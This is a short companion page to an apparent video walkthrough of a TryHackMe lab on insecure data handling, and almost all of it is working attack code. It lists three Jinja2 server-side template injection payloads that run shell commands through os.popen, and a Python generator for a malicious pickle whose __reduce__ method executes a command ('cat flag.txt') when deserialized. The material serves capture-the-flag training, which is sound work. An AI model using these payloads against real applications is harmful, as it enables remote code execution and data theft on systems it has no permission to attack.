## TryHackMe Room: OWASP Top 10 2025: Insecure Data Handling

[TryHackMe OWASP Top 10 2025: Insecure Data Handling - Full Walkthrough 2025](https://youtu.be/V86pmhs44x0)

**Below commands used on TryHackMe room OWASP Top 10 2025: Insecure Data Handling YouTube video walk through:**

```
{{lipsum.__globals__['os'].popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Python pickle generator:

```
import pickle
import base64
import subprocess 

class MaliciousLS:
    def __reduce__(self):
        # The command we want to run
        cmd = ['cat', 'flag.txt']
        
        # The function that executes the command and returns the output string
        # subprocess.check_output returns the output as bytes, so we decode it.
        return (subprocess.check_output, (cmd,))

# Generate and encode the payload
pickled = pickle.dumps(MaliciousLS())
encoded = base64.b64encode(pickled).decode()
print(encoded)
```
